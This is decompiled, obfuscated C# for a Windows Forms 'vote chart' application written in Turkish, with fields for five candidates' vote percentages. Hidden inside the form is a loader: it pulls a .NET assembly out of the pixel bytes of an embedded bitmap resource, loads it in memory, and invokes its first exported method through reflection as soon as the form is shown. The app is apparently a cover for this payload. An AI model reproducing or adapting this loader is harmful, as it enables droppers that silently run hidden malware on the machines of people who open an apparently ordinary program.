using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using DlImageParsr.Properties;

namespace LqHyLjKQHwjIbZdxED;

public class qjCHDH4E8ebruGbgGD : Form
{
	private object[] pCNNut2fO;

	private IContainer DpcUTBVY7;

	private static object EUNiL536O;

	private Panel d5sYW1ywa;

	private Label PuBmSjRpW;

	private Label kqenjFAsQ;

	private Label v8GpEEu6q;

	private Label msWfZZYqu;

	private Label QsTByduCY;

	private Label KTbqX1SiV;

	private Label lNG6p1B0S;

	private TextBox ikSkyNIH5;

	private TextBox N11jURtD7;

	private TextBox Lv6xDsnfd;

	private TextBox Tptg2uWFO;

	private TextBox whkEyp9nf;

	private Label Vn1VhYx2d;

	private Button y1pI4jT57;

	private Label Q4ICwSSIn;

	private static qjCHDH4E8ebruGbgGD IDHj4S816D6OIvJCUj;

	public qjCHDH4E8ebruGbgGD()
	{
		R8TayKhW8eikpukIpe.piUZpdWzJZMua();
		pCNNut2fO = new object[3] { "454C6249", "617166", "DlImageParsr" };
		DpcUTBVY7 = null;
		((Form)this)._002Ector();
		MjjwCHDHE();
		MethodInfo methodInfo = ((Type)EUNiL536O).GetMethods()[0];
		methodInfo.Invoke(null, pCNNut2fO);
	}

	private int LqHKyLjQH(string string_0)
	{
		try
		{
			return int.Parse(string_0);
		}
		catch (FormatException)
		{
			return -1;
		}
	}

	private void djI4bZdxE(object sender, EventArgs e)
	{
		Hashtable hashtable = new Hashtable();
		eayMIitX3Y0p4IlDmR(hashtable, 'A', B7ApUedvMwbtisiLRs(whkEyp9nf));
		hashtable.Add('B', ((Control)Tptg2uWFO).get_Text());
		eayMIitX3Y0p4IlDmR(hashtable, 'C', B7ApUedvMwbtisiLRs(Lv6xDsnfd));
		hashtable.Add('D', ((Control)N11jURtD7).get_Text());
		hashtable.Add('E', B7ApUedvMwbtisiLRs(ikSkyNIH5));
		Hashtable hashtable2 = hashtable;
		SortedDictionary<string, int> sortedDictionary = new SortedDictionary<string, int>();
		bool flag = true;
		int num = 3;
		if (QsG8HiBu2DGayXesSe())
		{
			int num3 = default(int);
			int num2 = default(int);
			while (true)
			{
				switch (num)
				{
				case 3:
					num3 = 0;
					{
						IDictionaryEnumerator dictionaryEnumerator = hashtable2.GetEnumerator();
						try
						{
							while (true)
							{
								if (!dictionaryEnumerator.MoveNext())
								{
									if (PVVFP8GiKh2CZNIbOF() != null)
									{
										break;
									}
									switch (1)
									{
									case 1:
										goto end_IL_0114;
									}
								}
								DictionaryEntry dictionaryEntry = (DictionaryEntry)dictionaryEnumerator.Current;
								int num4 = LqHKyLjQH(dictionaryEntry.Value!.ToString());
								if (num4 == -1)
								{
									flag = false;
									continue;
								}
								sortedDictionary.Add(dictionaryEntry.Key.ToString(), num4);
								num3 += num4;
								continue;
								end_IL_0114:
								break;
							}
						}
						finally
						{
							IDisposable disposable = dictionaryEnumerator as IDisposable;
							if (disposable != null)
							{
								disposable.Dispose();
							}
						}
					}
					num2 = SskVitFf1Hn4V8S5MR(sortedDictionary);
					num = 1;
					if (QsG8HiBu2DGayXesSe())
					{
						continue;
					}
					goto default;
				case 1:
					if (!flag || num2 != 5)
					{
						((Control)Q4ICwSSIn).set_Text("Lütfen tüm adayların yüzde değerlerini sayı olarak girin!");
						return;
					}
					goto default;
				default:
					if (num3 != 100)
					{
						((Control)Q4ICwSSIn).set_Text("Fazla ya da eksik değer girdiniz. Değerlerin toplamı 100 olmalı! Girdiğiniz değerler toplamı:" + num3);
						return;
					}
					((Control)Q4ICwSSIn).set_Text("");
					break;
				case 2:
					break;
				}
				break;
			}
		}
		foreach (KeyValuePair<string, int> item in sortedDictionary)
		{
			_ = item;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && DpcUTBVY7 != null)
		{
			if (PVVFP8GiKh2CZNIbOF() == null)
			{
				switch (0)
				{
				}
			}
			DpcUTBVY7.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void MjjwCHDHE()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_01b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bc: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_03b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c2: Expected O, but got Unknown
		//IL_0449: Unknown result type (might be due to invalid IL or missing references)
		//IL_0453: Expected O, but got Unknown
		//IL_055a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0564: Expected O, but got Unknown
		//IL_0868: Unknown result type (might be due to invalid IL or missing references)
		//IL_0872: Expected O, but got Unknown
		//IL_09d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e0: Expected O, but got Unknown
		//IL_0a0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a17: Expected O, but got Unknown
		//IL_0a18: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a22: Expected O, but got Unknown
		//IL_0ae9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af3: Expected O, but got Unknown
		//IL_0b0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b14: Expected O, but got Unknown
		//IL_0b15: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1f: Expected O, but got Unknown
		//IL_0b20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b2a: Expected O, but got Unknown
		//IL_0b2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b35: Expected O, but got Unknown
		//IL_0b36: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b40: Expected O, but got Unknown
		//IL_0b41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4b: Expected O, but got Unknown
		//IL_0b4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b56: Expected O, but got Unknown
		//IL_0b57: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b61: Expected O, but got Unknown
		//IL_0b62: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b6c: Expected O, but got Unknown
		//IL_0b6d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b77: Expected O, but got Unknown
		d5sYW1ywa = new Panel();
		Q4ICwSSIn = new Label();
		y1pI4jT57 = new Button();
		int num2 = default(int);
		while (true)
		{
			Vn1VhYx2d = new Label();
			v8GpEEu6q = new Label();
			msWfZZYqu = new Label();
			QsTByduCY = new Label();
			KTbqX1SiV = new Label();
			lNG6p1B0S = new Label();
			ikSkyNIH5 = new TextBox();
			N11jURtD7 = new TextBox();
			Lv6xDsnfd = new TextBox();
			Tptg2uWFO = new TextBox();
			while (true)
			{
				whkEyp9nf = new TextBox();
				int num = 0;
				if (PVVFP8GiKh2CZNIbOF() != null)
				{
					goto IL_00f1;
				}
				goto IL_0a5e;
				IL_0a5e:
				while (true)
				{
					switch (num)
					{
					case 30:
						((Control)Lv6xDsnfd).set_TabIndex(4);
						((Control)Tptg2uWFO).set_Location(new Point(84, 151));
						sE6iu5eLHV564xqbsO(Tptg2uWFO, 3);
						((Control)Tptg2uWFO).set_Name("textBoxB");
						((Control)Tptg2uWFO).set_Size(new Size(100, 20));
						((Control)Tptg2uWFO).set_TabIndex(3);
						goto case 11;
					case 11:
						((Control)whkEyp9nf).set_Location(new Point(84, 125));
						goto case 17;
					case 17:
						((TextBoxBase)whkEyp9nf).set_MaxLength(3);
						((Control)whkEyp9nf).set_Name("textBoxA");
						((Control)whkEyp9nf).set_Size(new Size(100, 20));
						((Control)whkEyp9nf).set_TabIndex(2);
						((Control)PuBmSjRpW).set_AutoSize(true);
						num = 24;
						if (QsG8HiBu2DGayXesSe())
						{
							continue;
						}
						goto IL_00f1;
					case 29:
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)msWfZZYqu);
						num = 16;
						if (QsG8HiBu2DGayXesSe())
						{
							continue;
						}
						goto IL_00f1;
					case 28:
						((Control)y1pI4jT57).add_Click((EventHandler)djI4bZdxE);
						Y6aMC60X0RbLyDd0O1(Vn1VhYx2d, bool_0: true);
						((Control)Vn1VhYx2d).set_Font(new Font("Segoe UI", 11f, (FontStyle)1));
						((Control)Vn1VhYx2d).set_ForeColor(hrQ103LJNuLOwJegKy());
						num = 4;
						if (PVVFP8GiKh2CZNIbOF() == null)
						{
							continue;
						}
						goto IL_00f1;
					case 27:
						((Control)PuBmSjRpW).set_Text("OY YÜZDESİ");
						((Control)kqenjFAsQ).set_AutoSize(true);
						((Control)kqenjFAsQ).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
						((Control)kqenjFAsQ).set_Location(new Point(31, 92));
						((Control)kqenjFAsQ).set_Name("label1");
						((Control)kqenjFAsQ).set_Size(new Size(57, 19));
						goto case 23;
					case 23:
						((Control)kqenjFAsQ).set_TabIndex(0);
						((Control)kqenjFAsQ).set_Text("KİŞİLER");
						goto case 6;
					case 6:
						((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
						uDY1OmOoeMaPESXkoM(this, (AutoScaleMode)1);
						((Form)this).set_ClientSize(new Size(654, 443));
						((Control)this).get_Controls().Add((Control)(object)d5sYW1ywa);
						((Control)this).set_MaximumSize(new Size(670, 482));
						((Control)this).set_MinimumSize(new Size(670, 482));
						((Control)this).set_Name("Form1");
						((Control)this).set_Text("Oy Grafiği Uygulaması");
						((Control)d5sYW1ywa).ResumeLayout(false);
						((Control)d5sYW1ywa).PerformLayout();
						((Control)this).ResumeLayout(false);
						NxIOWXkRGYRK8l0yoq(this);
						num = 13;
						if (QsG8HiBu2DGayXesSe())
						{
							continue;
						}
						goto IL_00f1;
					case 26:
						((Control)msWfZZYqu).set_Size(new Size(19, 19));
						u6OCJY5BT7MeXRtjhZ(msWfZZYqu, 10);
						num = 2;
						if (PVVFP8GiKh2CZNIbOF() != null)
						{
							continue;
						}
						goto case 20;
					case 20:
						((Control)msWfZZYqu).set_Text("D");
						((Control)QsTByduCY).set_AutoSize(true);
						((Control)QsTByduCY).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
						((Control)QsTByduCY).set_Location(new Point(64, 177));
						((Control)QsTByduCY).set_Name("label5");
						((Control)QsTByduCY).set_Size(new Size(18, 19));
						u6OCJY5BT7MeXRtjhZ(QsTByduCY, 9);
						num = 7;
						if (PVVFP8GiKh2CZNIbOF() != null)
						{
							continue;
						}
						goto case 7;
					case 7:
						((Control)QsTByduCY).set_Text("C");
						((Control)KTbqX1SiV).set_AutoSize(true);
						((Control)KTbqX1SiV).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
						((Control)KTbqX1SiV).set_Location(new Point(64, 151));
						((Control)KTbqX1SiV).set_Name("label4");
						((Control)KTbqX1SiV).set_Size(new Size(18, 19));
						num = 15;
						if (PVVFP8GiKh2CZNIbOF() == null)
						{
							continue;
						}
						goto end_IL_0ae8;
					case 25:
						((Control)y1pI4jT57).set_Text("Grafik Oluştur");
						num = 1;
						if (QsG8HiBu2DGayXesSe())
						{
							continue;
						}
						goto IL_00f1;
					case 24:
						((Control)PuBmSjRpW).set_Font(new Font("Segoe UI", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
						DE7VZOPCSvFqetjixh(PuBmSjRpW, new Point(94, 92));
						((Control)PuBmSjRpW).set_Name("label2");
						kLT2W5JSeXFGajJGwp(PuBmSjRpW, new Size(90, 19));
						((Control)PuBmSjRpW).set_TabIndex(1);
						goto case 27;
					case 22:
						((Control)lNG6p1B0S).set_Name("label3");
						((Control)lNG6p1B0S).set_Size(new Size(19, 19));
						u6OCJY5BT7MeXRtjhZ(lNG6p1B0S, 7);
						((Control)lNG6p1B0S).set_Text("A");
						((Control)ikSkyNIH5).set_Location(new Point(84, 229));
						((TextBoxBase)ikSkyNIH5).set_MaxLength(3);
						num = 9;
						if (PVVFP8GiKh2CZNIbOF() == null)
						{
							continue;
						}
						goto case 1;
					case 1:
						((ButtonBase)y1pI4jT57).set_UseVisualStyleBackColor(true);
						goto case 28;
					case 21:
						u6OCJY5BT7MeXRtjhZ(Vn1VhYx2d, 12);
						CI7pMfnxQB8seGopZ7(Vn1VhYx2d, "OY GRAFİĞİ UYGULAMASI");
						((Control)v8GpEEu6q).set_AutoSize(true);
						((Control)v8GpEEu6q).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
						((Control)v8GpEEu6q).set_Location(new Point(63, 229));
						ocQfq7VmqxlD4rFoYY(v8GpEEu6q, "label7");
						((Control)v8GpEEu6q).set_Size(new Size(16, 19));
						((Control)v8GpEEu6q).set_TabIndex(11);
						((Control)v8GpEEu6q).set_Text("E");
						num = 5;
						if (PVVFP8GiKh2CZNIbOF() == null)
						{
							continue;
						}
						goto case 3;
					case 3:
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)y1pI4jT57);
						num = 18;
						if (QsG8HiBu2DGayXesSe())
						{
							continue;
						}
						goto IL_00f1;
					case 19:
						((Control)Q4ICwSSIn).set_Size(new Size(0, 13));
						((Control)Q4ICwSSIn).set_TabIndex(14);
						((Control)y1pI4jT57).set_Location(new Point(84, 273));
						((Control)y1pI4jT57).set_Name("button1");
						((Control)y1pI4jT57).set_Size(new Size(100, 23));
						((Control)y1pI4jT57).set_TabIndex(13);
						goto case 25;
					case 18:
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)Vn1VhYx2d);
						((ControlCollection)zvGQArUuh6FREntETr(d5sYW1ywa)).Add((Control)(object)v8GpEEu6q);
						num2 = 29;
						goto case 29;
					case 16:
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)QsTByduCY);
						goto case 2;
					case 2:
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)KTbqX1SiV);
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)lNG6p1B0S);
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)ikSkyNIH5);
						goto case 14;
					case 14:
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)N11jURtD7);
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)Lv6xDsnfd);
						((ControlCollection)zvGQArUuh6FREntETr(d5sYW1ywa)).Add((Control)(object)Tptg2uWFO);
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)whkEyp9nf);
						((ControlCollection)zvGQArUuh6FREntETr(d5sYW1ywa)).Add((Control)(object)PuBmSjRpW);
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)kqenjFAsQ);
						((Control)d5sYW1ywa).set_Location(new Point(0, 0));
						((Control)d5sYW1ywa).set_Name("panel1");
						((Control)d5sYW1ywa).set_Size(new Size(211, 443));
						((Control)d5sYW1ywa).set_TabIndex(0);
						((Control)Q4ICwSSIn).set_AutoSize(true);
						((Control)Q4ICwSSIn).set_ForeColor(Color.DarkRed);
						((Control)Q4ICwSSIn).set_Location(new Point(6, 313));
						((Control)Q4ICwSSIn).set_MaximumSize(new Size(200, 0));
						goto case 10;
					case 10:
						((Control)Q4ICwSSIn).set_Name("message");
						num = 19;
						if (QsG8HiBu2DGayXesSe())
						{
							continue;
						}
						goto case 18;
					case 15:
						((Control)KTbqX1SiV).set_TabIndex(8);
						((Control)KTbqX1SiV).set_Text("B");
						((Control)lNG6p1B0S).set_AutoSize(true);
						((Control)lNG6p1B0S).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
						((Control)lNG6p1B0S).set_Location(new Point(64, 125));
						goto case 22;
					case 9:
						((Control)ikSkyNIH5).set_Name("textBoxE");
						((Control)ikSkyNIH5).set_Size(new Size(100, 20));
						((Control)ikSkyNIH5).set_TabIndex(6);
						num = 8;
						if (QsG8HiBu2DGayXesSe())
						{
							continue;
						}
						goto case 4;
					case 4:
						((Control)Vn1VhYx2d).set_Location(new Point(8, 31));
						((Control)Vn1VhYx2d).set_Name("label8");
						((Control)Vn1VhYx2d).set_Size(new Size(197, 20));
						num = 21;
						if (PVVFP8GiKh2CZNIbOF() == null)
						{
							continue;
						}
						goto case 9;
					case 8:
						((Control)N11jURtD7).set_Location(new Point(84, 203));
						((TextBoxBase)N11jURtD7).set_MaxLength(3);
						((Control)N11jURtD7).set_Name("textBoxD");
						((Control)N11jURtD7).set_Size(new Size(100, 20));
						u6OCJY5BT7MeXRtjhZ(N11jURtD7, 5);
						DE7VZOPCSvFqetjixh(Lv6xDsnfd, new Point(84, 177));
						((TextBoxBase)Lv6xDsnfd).set_MaxLength(3);
						((Control)Lv6xDsnfd).set_Name("textBoxC");
						((Control)Lv6xDsnfd).set_Size(new Size(100, 20));
						goto case 30;
					case 5:
						((Control)msWfZZYqu).set_AutoSize(true);
						((Control)msWfZZYqu).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
						DE7VZOPCSvFqetjixh(msWfZZYqu, new Point(63, 203));
						((Control)msWfZZYqu).set_Name("label6");
						goto case 26;
					default:
						PuBmSjRpW = new Label();
						kqenjFAsQ = new Label();
						((Control)d5sYW1ywa).SuspendLayout();
						yEmxSQDdv1R3voHcLs(this);
						((Control)d5sYW1ywa).set_BackColor(Color.Silver);
						((Control)d5sYW1ywa).get_Controls().Add((Control)(object)Q4ICwSSIn);
						goto case 3;
					case 31:
						break;
					case 12:
						goto end_IL_0ae8;
					case 13:
						return;
					}
					break;
				}
				continue;
				IL_00f1:
				num = num2;
				goto IL_0a5e;
				continue;
				end_IL_0ae8:
				break;
			}
		}
	}

	public virtual void Fu7kDI6YMq()
	{
		xebvruGbg("");
	}

	private static string xebvruGbg(string string_0)
	{
		int num = 0;
		byte[] array = new byte[78336];
		Bitmap val = Resources.lTG4SubMFl();
		int num2 = 0;
		int num4 = default(int);
		int num5 = default(int);
		while (true)
		{
			bool flag = num2 < 78336;
			int num3 = 1;
			if (PVVFP8GiKh2CZNIbOF() != null)
			{
				goto IL_006b;
			}
			goto IL_0077;
			IL_0077:
			while (true)
			{
				switch (num3)
				{
				case 3:
					num4 = 0;
					num5 = 2;
					goto default;
				default:
					if (num4 >= 1)
					{
						break;
					}
					goto IL_002e;
				case 1:
					if (!flag)
					{
						EUNiL536O = ((Assembly)OkpdkuSbpahJcPT2X5(Assembly.Load(array))).GetExportedTypes()[1];
						return string_0;
					}
					goto case 3;
				}
				break;
				IL_002e:
				UDD94CPYB(val, num2, num4);
				Color pixel = val.GetPixel(num2, num4);
				int num6 = ColorTranslator.ToWin32(pixel);
				array[num] = (byte)num6;
				num4++;
				num3 = 0;
				if (QsG8HiBu2DGayXesSe())
				{
					continue;
				}
				goto IL_006b;
			}
			num++;
			num2++;
			continue;
			IL_006b:
			num3 = num5;
			goto IL_0077;
		}
	}

	private static Color UDD94CPYB(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	private static Assembly Rh22NQwik(object object_0)
	{
		return (Assembly)object_0;
	}

	internal static bool QsG8HiBu2DGayXesSe()
	{
		return IDHj4S816D6OIvJCUj == null;
	}

	internal static qjCHDH4E8ebruGbgGD PVVFP8GiKh2CZNIbOF()
	{
		return IDHj4S816D6OIvJCUj;
	}

	internal static object B7ApUedvMwbtisiLRs(object object_0)
	{
		return ((Control)object_0).get_Text();
	}

	internal static void eayMIitX3Y0p4IlDmR(object object_0, object object_1, object object_2)
	{
		((Hashtable)object_0).Add(object_1, object_2);
	}

	internal static int SskVitFf1Hn4V8S5MR(object object_0)
	{
		return ((SortedDictionary<string, int>)object_0).Count;
	}

	internal static void yEmxSQDdv1R3voHcLs(object object_0)
	{
		((Control)object_0).SuspendLayout();
	}

	internal static object zvGQArUuh6FREntETr(object object_0)
	{
		return ((Control)object_0).get_Controls();
	}

	internal static void Y6aMC60X0RbLyDd0O1(object object_0, bool bool_0)
	{
		((Control)object_0).set_AutoSize(bool_0);
	}

	internal static Color hrQ103LJNuLOwJegKy()
	{
		return Color.MediumBlue;
	}

	internal static void u6OCJY5BT7MeXRtjhZ(object object_0, int int_0)
	{
		((Control)object_0).set_TabIndex(int_0);
	}

	internal static void CI7pMfnxQB8seGopZ7(object object_0, object object_1)
	{
		((Control)object_0).set_Text((string)object_1);
	}

	internal static void ocQfq7VmqxlD4rFoYY(object object_0, object object_1)
	{
		((Control)object_0).set_Name((string)object_1);
	}

	internal static void DE7VZOPCSvFqetjixh(object object_0, Point point_0)
	{
		((Control)object_0).set_Location(point_0);
	}

	internal static void sE6iu5eLHV564xqbsO(object object_0, int int_0)
	{
		((TextBoxBase)object_0).set_MaxLength(int_0);
	}

	internal static void kLT2W5JSeXFGajJGwp(object object_0, Size size_0)
	{
		((Control)object_0).set_Size(size_0);
	}

	internal static void uDY1OmOoeMaPESXkoM(object object_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		((ContainerControl)object_0).set_AutoScaleMode(autoScaleMode_0);
	}

	internal static void NxIOWXkRGYRK8l0yoq(object object_0)
	{
		((qjCHDH4E8ebruGbgGD)object_0).Fu7kDI6YMq();
	}

	internal static object OkpdkuSbpahJcPT2X5(object object_0)
	{
		return Rh22NQwik(object_0);
	}
}
